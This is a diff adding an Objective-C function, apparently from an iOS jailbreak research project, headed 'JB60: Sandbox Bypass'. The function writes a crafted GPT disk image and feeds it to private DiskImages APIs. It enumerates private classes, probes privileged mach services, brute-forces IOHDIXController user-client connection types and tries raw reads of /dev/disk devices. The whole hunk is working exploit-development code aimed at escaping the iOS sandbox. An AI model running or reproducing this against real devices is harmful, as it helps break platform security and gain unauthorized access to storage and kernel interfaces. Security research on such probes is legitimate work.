@@ -43631,3 +43631,389 @@ void iosurface_gpt_mount(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB60: Sandbox Bypass — Alternative GPT Mount Paths
+
+void iosurface_sandbox_bypass(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB60: === Sandbox Bypass — Alternative GPT Mount Paths ===");
+
+        void *hDI = dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+        void *hDI2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+        void *hMK = dlopen("/System/Library/PrivateFrameworks/MediaKit.framework/MediaKit", RTLD_NOW);
+
+        typedef id(*msgsend_fn)(id, SEL, ...);
+        msgsend_fn msg = (msgsend_fn)dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        typedef void*(*matching_fn)(const char*);
+        typedef int(*getsvcs_fn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*iternext_fn)(unsigned int);
+        typedef int(*regname_fn)(unsigned int, char*);
+        typedef void(*objrelease_fn)(unsigned int);
+        typedef int(*svcopen_fn)(unsigned int, uint32_t, unsigned int, unsigned int*);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getsvcs_fn sym_getsvcs = (getsvcs_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        iternext_fn sym_next = (iternext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        regname_fn sym_regname = (regname_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetName");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        typedef int(*close_fn)(unsigned int);
+        close_fn sym_close = (close_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod") ? (close_fn)dlsym(RTLD_DEFAULT, "IOServiceClose") : NULL;
+        typedef unsigned int(*getmaster_fn)(unsigned int, void*);
+        typedef unsigned int(*svcgetmatching_fn)(unsigned int, const char*);
+        svcgetmatching_fn sym_svcmatch = (svcgetmatching_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        typedef unsigned long(*crc32_fn)(unsigned long, const unsigned char*, unsigned int);
+        crc32_fn zcrc32 = (crc32_fn)dlsym(RTLD_DEFAULT, "crc32");
+
+        if (!msg || !sym_matching || !sym_getsvcs || !sym_next || !zcrc32) {
+            results[@"verdict"] = @"NO_SYMBOLS";
+            done(results);
+            return;
+        }
+
+        // X1: toDI1ParamsWithError — legacy DiskImages1 conversion
+        log(@"JB60: --- X1: DI1 legacy path ---");
+        int x1_di1_ok = 0;
+        {
+            Class diClass = NSClassFromString(@"DIAttachParams");
+            if (diClass) {
+                NSString *imgPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb60_gpt.img"];
+                uint32_t sec_sz = 512;
+                uint32_t total_sec = 8192;
+                uint32_t img_sz = sec_sz * total_sec;
+                uint32_t nent = 8;
+                uint32_t entsz = 128;
+                uint32_t ent_sectors = (nent * entsz + sec_sz - 1) / sec_sz;
+                uint64_t first_usable = 2 + ent_sectors;
+                uint64_t last_usable = total_sec - 2 - ent_sectors;
+
+                uint8_t *imgbuf = (uint8_t *)calloc(1, img_sz);
+                if (imgbuf) {
+                    imgbuf[446 + 4] = 0xEE;
+                    imgbuf[446 + 8] = 1;
+                    uint32_t mbrsz = total_sec - 1;
+                    memcpy(imgbuf + 446 + 12, &mbrsz, 4);
+                    imgbuf[510] = 0x55; imgbuf[511] = 0xAA;
+
+                    uint8_t *h = imgbuf + sec_sz;
+                    memcpy(h, "EFI PART", 8);
+                    uint32_t tmp32; uint64_t tmp64;
+                    tmp32 = 0x00010000; memcpy(h + 8, &tmp32, 4);
+                    tmp32 = 92; memcpy(h + 12, &tmp32, 4);
+                    tmp64 = 1; memcpy(h + 24, &tmp64, 8);
+                    tmp64 = total_sec - 1; memcpy(h + 32, &tmp64, 8);
+                    tmp64 = first_usable; memcpy(h + 40, &tmp64, 8);
+                    tmp64 = last_usable; memcpy(h + 48, &tmp64, 8);
+                    arc4random_buf(h + 56, 16);
+                    tmp64 = 2; memcpy(h + 72, &tmp64, 8);
+                    tmp32 = nent; memcpy(h + 80, &tmp32, 4);
+                    tmp32 = entsz; memcpy(h + 84, &tmp32, 4);
+
+                    uint8_t *entries = imgbuf + 2 * sec_sz;
+                    uint8_t type_guid[16] = {0xA2,0xA0,0xD0,0xEB,0xE5,0xB9,0x33,0x44,
+                                             0x87,0xC0,0x68,0xB6,0xB7,0x26,0x99,0xC7};
+                    for (int p = 0; p < (int)nent; p++) {
+                        uint8_t *e = entries + p * entsz;
+                        memcpy(e, type_guid, 16);
+                        arc4random_buf(e + 16, 16);
+                        uint64_t pstart = first_usable + (uint64_t)p;
+                        uint64_t pend = pstart;
+                        memcpy(e + 32, &pstart, 8);
+                        memcpy(e + 40, &pend, 8);
+                        if (p < 7) {
+                            for (int i = 0; i < 8; i++) { e[56 + i*2] = 'P'; e[56 + i*2 + 1] = 0; }
+                        } else {
+                            for (int i = 0; i < 36; i++) { e[56 + i*2] = (uint8_t)('A' + (i%26)); e[56 + i*2 + 1] = 0; }
+                        }
+                    }
+
+                    uint32_t ecrc = (uint32_t)zcrc32(0, entries, nent * entsz);
+                    memcpy(h + 88, &ecrc, 4);
+                    memset(h + 16, 0, 4);
+                    uint32_t hcrc = (uint32_t)zcrc32(0, h, 92);
+                    memcpy(h + 16, &hcrc, 4);
+
+                    uint64_t bk_ent_start = total_sec - 1 - ent_sectors;
+                    memcpy(imgbuf + bk_ent_start * sec_sz, entries, nent * entsz);
+                    uint8_t *bh = imgbuf + (total_sec - 1) * sec_sz;
+                    memcpy(bh, h, 92);
+                    tmp64 = total_sec - 1; memcpy(bh + 24, &tmp64, 8);
+                    tmp64 = 1; memcpy(bh + 32, &tmp64, 8);
+                    memcpy(bh + 72, &bk_ent_start, 8);
+                    memset(bh + 16, 0, 4);
+                    uint32_t bhcrc = (uint32_t)zcrc32(0, bh, 92);
+                    memcpy(bh + 16, &bhcrc, 4);
+
+                    NSData *imgData = [NSData dataWithBytesNoCopy:imgbuf length:img_sz freeWhenDone:NO];
+                    [imgData writeToFile:imgPath atomically:YES];
+                    free(imgbuf);
+                }
+
+                NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+                NSError *err = nil;
+                typedef id(*initURL_fn)(id, SEL, id, NSError**);
+                initURL_fn initFn = (initURL_fn)msg;
+                id params = initFn([diClass alloc], @selector(initWithURL:error:), imgURL, &err);
+
+                if (params) {
+                    typedef id(*toDI1_fn)(id, SEL, NSError**);
+                    toDI1_fn di1Fn = (toDI1_fn)msg;
+                    err = nil;
+                    @try {
+                        id di1params = di1Fn(params, @selector(toDI1ParamsWithError:), &err);
+                        if (di1params) {
+                            x1_di1_ok = 1;
+                            NSString *cls = NSStringFromClass([di1params class]);
+                            log([NSString stringWithFormat:@"JB60: X1 DI1 params class=%@", cls]);
+
+                            unsigned int mcount = 0;
+                            Method *methods = class_copyMethodList([di1params class], &mcount);
+                            if (methods) {
+                                for (unsigned int i = 0; i < mcount && i < 30; i++) {
+                                    log([NSString stringWithFormat:@"JB60: X1 DI1 [%u] %s", i, sel_getName(method_getName(methods[i]))]);
+                                }
+                                free(methods);
+                            }
+                            log([NSString stringWithFormat:@"JB60: X1 DI1 methods=%u", mcount]);
+                        } else {
+                            log([NSString stringWithFormat:@"JB60: X1 toDI1 failed: %@", err]);
+                        }
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB60: X1 toDI1 exception: %@", ex.reason]);
+                    }
+                }
+                [[NSFileManager defaultManager] removeItemAtPath:imgPath error:nil];
+            }
+        }
+        results[@"x1_di1"] = @(x1_di1_ok);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X2: Enumerate ALL DiskImages/DiskImages2 ObjC classes
+        log(@"JB60: --- X2: DiskImages class enumeration ---");
+        int x2_classes = 0;
+        {
+            unsigned int clsCount = 0;
+            Class *allClasses = objc_copyClassList(&clsCount);
+            if (allClasses) {
+                for (unsigned int i = 0; i < clsCount; i++) {
+                    const char *name = class_getName(allClasses[i]);
+                    if (name && (strstr(name, "DI") == name || strstr(name, "HDI") != NULL ||
+                                 strstr(name, "DiskImage") != NULL || strstr(name, "DMG") != NULL)) {
+                        x2_classes++;
+                        log([NSString stringWithFormat:@"JB60: X2 class: %s", name]);
+                    }
+                }
+                free(allClasses);
+            }
+        }
+        results[@"x2_classes"] = @(x2_classes);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X3: Bootstrap lookup for disk-image-related mach services
+        log(@"JB60: --- X3: Mach service lookup ---");
+        int x3_found = 0;
+        {
+            typedef int(*bootstrap_fn)(unsigned int, const char*, unsigned int*);
+            bootstrap_fn sym_lookup = (bootstrap_fn)dlsym(RTLD_DEFAULT, "bootstrap_look_up");
+            typedef unsigned int(*task_self_fn)(void);
+            task_self_fn sym_task = (task_self_fn)dlsym(RTLD_DEFAULT, "mach_task_self");
+            typedef unsigned int(*bootstrap_port_fn)(void);
+
+            unsigned int bport = 0;
+            typedef int(*task_get_bp_fn)(unsigned int, unsigned int*);
+            task_get_bp_fn sym_getbp = (task_get_bp_fn)dlsym(RTLD_DEFAULT, "task_get_bootstrap_port");
+            if (sym_getbp && sym_task) {
+                sym_getbp(sym_task(), &bport);
+            }
+
+            if (sym_lookup && bport) {
+                const char *services[] = {
+                    "com.apple.diskimagescontroller",
+                    "com.apple.DiskImages2.HelperService",
+                    "com.apple.DiskImages.HelperService",
+                    "com.apple.hdid",
+                    "com.apple.diskarbitrationd",
+                    "com.apple.diskmanagementd",
+                    "com.apple.storagekitd",
+                    "com.apple.MediaKit",
+                    "io.corestorage.corestoraged",
+                    "com.apple.apfsd",
+                    "com.apple.fsdispatchd"
+                };
+                for (int s = 0; s < 11; s++) {
+                    unsigned int port = 0;
+                    int kr = sym_lookup(bport, services[s], &port);
+                    if (kr == 0 && port != 0) {
+                        x3_found++;
+                        log([NSString stringWithFormat:@"JB60: X3 FOUND service '%s' port=%u", services[s], port]);
+                    } else {
+                        log([NSString stringWithFormat:@"JB60: X3 '%s' kr=%d", services[s], kr]);
+                    }
+                }
+            } else {
+                log([NSString stringWithFormat:@"JB60: X3 bootstrap lookup=%p bport=%u", sym_lookup, bport]);
+            }
+        }
+        results[@"x3_services"] = @(x3_found);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X4: IOHDIXController extended connection type scan (11-50)
+        log(@"JB60: --- X4: IOHDIXController types 11-50 ---");
+        int x4_connected = 0;
+        if (sym_open && sym_svcmatch) {
+            unsigned int hdix = (unsigned int)(uintptr_t)sym_svcmatch(0, sym_matching("IOHDIXController"));
+            if (hdix) {
+                log([NSString stringWithFormat:@"JB60: X4 IOHDIXController svc=%u", hdix]);
+                for (uint32_t t = 11; t <= 50 && !isr_stopped(); t++) {
+                    unsigned int conn = 0;
+                    int kr = sym_open(hdix, mach_task_self(), t, &conn);
+                    if (kr == 0 && conn) {
+                        x4_connected++;
+                        log([NSString stringWithFormat:@"JB60: X4 CONNECTED type=%u conn=%u", t, conn]);
+                        if (sym_close) sym_close(conn);
+                    } else if (kr != (int)0xe00002c2) {
+                        log([NSString stringWithFormat:@"JB60: X4 type=%u kr=0x%x", t, (unsigned)kr]);
+                    }
+                }
+                sym_release(hdix);
+            } else {
+                log(@"JB60: X4 IOHDIXController not found");
+            }
+        }
+        results[@"x4_connected"] = @(x4_connected);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X5: Enumerate IOStorage-related services for direct kernel paths
+        log(@"JB60: --- X5: IOStorage service scan ---");
+        int x5_found = 0;
+        {
+            const char *classes[] = {
+                "IOBlockStorageDevice", "IOBlockStorageDriver",
+                "IOStorageFamily", "IOCDMedia", "IODVDMedia",
+                "IOFilterScheme", "IORAIDSet", "IOApplePartitionScheme",
+                "IOGPTPartitionScheme", "IOFDiskPartitionScheme",
+                "IOMediaBSDClient", "IOCDPartitionScheme"
+            };
+            for (int c = 0; c < 12 && !isr_stopped(); c++) {
+                unsigned int iter = 0;
+                int kr = sym_getsvcs(0, sym_matching(classes[c]), &iter);
+                if (kr == 0 && iter) {
+                    unsigned int svc;
+                    while ((svc = sym_next(iter)) != 0) {
+                        x5_found++;
+                        char nm[256] = {0};
+                        sym_regname(svc, nm);
+                        log([NSString stringWithFormat:@"JB60: X5 %s: '%s' svc=%u", classes[c], nm, svc]);
+
+                        if (sym_open) {
+                            unsigned int conn = 0;
+                            int okr = sym_open(svc, mach_task_self(), 0, &conn);
+                            if (okr == 0 && conn) {
+                                log([NSString stringWithFormat:@"JB60: X5 OPEN OK conn=%u", conn]);
+                                if (sym_close) sym_close(conn);
+                            } else {
+                                log([NSString stringWithFormat:@"JB60: X5 open kr=0x%x", (unsigned)okr]);
+                            }
+                        }
+                        sym_release(svc);
+                    }
+                    sym_release(iter);
+                }
+            }
+        }
+        results[@"x5_storage"] = @(x5_found);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X6: Look for DI-related C functions in DiskImages frameworks
+        log(@"JB60: --- X6: DiskImages C function scan ---");
+        int x6_found = 0;
+        {
+            const char *funcs[] = {
+                "DIAttach", "DIDetach", "DIDeviceCreate",
+                "DIFileOpen", "DIFileCreate",
+                "HDICreate", "HDIAttach", "HDIOpen",
+                "DI_kextAttach", "DI_kextCreate",
+                "DIHelperCreate", "DIHelperAttach",
+                "di_root_image_mount",
+                "DIBackingStoreCreate", "DIBackingStoreOpen",
+                "DICFArrayCreate", "DIURLCreate"
+            };
+            for (int f = 0; f < 17; f++) {
+                void *sym = dlsym(RTLD_DEFAULT, funcs[f]);
+                if (sym) {
+                    x6_found++;
+                    log([NSString stringWithFormat:@"JB60: X6 FOUND %s at %p", funcs[f], sym]);
+                }
+            }
+        }
+        results[@"x6_cfuncs"] = @(x6_found);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // X7: Try to open /dev/disk* devices directly (bypass daemon)
+        log(@"JB60: --- X7: Direct /dev/disk access ---");
+        int x7_readable = 0;
+        {
+            NSFileManager *fm = [NSFileManager defaultManager];
+            NSError *err = nil;
+            NSArray *devItems = [fm contentsOfDirectoryAtPath:@"/dev" error:&err];
+            int diskCount = 0;
+            if (devItems) {
+                for (NSString *item in devItems) {
+                    if ([item hasPrefix:@"disk"] || [item hasPrefix:@"rdisk"]) {
+                        diskCount++;
+                        if (diskCount <= 10) {
+                            NSString *devPath = [@"/dev/" stringByAppendingString:item];
+                            int fd = open([devPath UTF8String], O_RDONLY);
+                            if (fd >= 0) {
+                                x7_readable++;
+                                uint8_t buf[512] = {0};
+                                ssize_t rd = read(fd, buf, 512);
+                                close(fd);
+                                log([NSString stringWithFormat:@"JB60: X7 OPENED %@ fd=%d read=%zd", item, fd, rd]);
+                                if (rd >= 8) {
+                                    NSMutableString *hex = [NSMutableString string];
+                                    for (int i = 0; i < 16; i++) [hex appendFormat:@"%02x", buf[i]];
+                                    log([NSString stringWithFormat:@"JB60: X7 first16=%@", hex]);
+                                }
+                            } else {
+                                if (diskCount <= 5) {
+                                    log([NSString stringWithFormat:@"JB60: X7 %@ errno=%d (%s)", item, errno, strerror(errno)]);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"JB60: X7 disk_devs=%d readable=%d", diskCount, x7_readable]);
+        }
+        results[@"x7_readable"] = @(x7_readable);
+
+        // Verdict
+        NSString *verdict = @"SANDBOX_BLOCKED";
+        if (x4_connected > 0) {
+            verdict = @"HDIX_CONNECTED";
+        } else if (x3_found > 0) {
+            verdict = @"SERVICE_FOUND";
+        } else if (x1_di1_ok) {
+            verdict = @"DI1_AVAILABLE";
+        } else if (x7_readable > 0) {
+            verdict = @"DISK_READABLE";
+        } else if (x2_classes > 0) {
+            verdict = @"CLASSES_FOUND";
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB60: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB60-sandbox-bypass-checkpoint.json", results);
+        done(results);
+    });
+}
